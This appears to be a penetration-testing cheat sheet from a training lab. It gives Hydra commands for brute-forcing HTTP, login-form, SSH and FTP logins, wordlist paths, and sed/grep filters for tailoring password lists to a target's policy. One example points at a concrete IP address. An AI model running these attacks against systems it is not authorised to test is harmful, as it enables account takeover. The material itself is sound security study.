# Hydra

| **Command**   | **Description**   |
| --------------|-------------------|
| `hydra -C wordlist.txt SERVER_IP -s PORT http-get /` | Basic Auth Brute Force - Combined Wordlist |
| `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /` | Basic Auth Brute Force - User/Pass Wordlists |
| `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"` | Login Form Brute Force - Static User, Pass Wordlist |
| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4` | SSH Brute Force - User/Pass Wordlists |
| `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1` | FTP Brute Force - Static User, Pass Wordlist |
> we can tell hydra to stop after the first successful login by specifying the flag `-f`  
> We will add the `-u` flag, so that it tries all users on each password, instead of trying all 14 million passwords on one user, before moving on to the next.
>
> example command  
> `hydra -l admin -P /usr/share/wordlists/rockyou.txt "http-post-form://64.227.34.91:30056/login.php:username=^USER^&password=^PASS^:F=<form name='login'" -t 64`
>
> In Hydra’s http-post-form module, success and failure conditions are crucial for properly identifying valid and invalid login attempts. Hydra primarily relies on failure conditions (F=...) to determine when a login attempt has failed, but you can also specify a success condition (S=...) to indicate when a login is successful.




# Wordlists

| **Command**   | **Description**   |
| --------------|-------------------|
| `/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` | Default Passwords Wordlist |
| `/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt` | Common Passwords Wordlist |
| `/usr/share/seclists/Usernames/Names/names.txt` | Common Names Wordlist |

# Misc

| **Command**   | **Description**   |
| --------------|-------------------|
| `hydra -h \| grep "Supported services" \| tr ":" "\n" \| tr " " "\n" \| column -e` | show support services |
| `hydra http-post-form -U` | list the parameters it requires and examples of usage |
| `cupp -i` | Creating Custom Password Wordlist |
| `sed -ri '/^.{,7}$/d' william.txt` | Remove Passwords Shorter Than 8 |
| ```sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt``` | Remove Passwords With No Special Chars |
| `sed -ri '/[0-9]+/!d' william.txt` | Remove Passwords With No Numbers |
| `./username-anarchy Bill Gates > bill.txt` | Generate Usernames List ||
| `netstat -antp \| grep -i list` | list services |


We now have a generated username.txt list and jane.txt password list, but there is one more thing we need to deal with. CUPP has generated many possible passwords for us, but Jane's company, AHI, has a rather odd password policy.

- Minimum Length: 6 characters
  
Must Include:
- At least one uppercase letter
- At least one lowercase letter
- At least one number
- At least two special characters (from the set !@#$%^&*)

As we did earlier, we can use grep to filter that password list to match that policy:
```
powen@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```
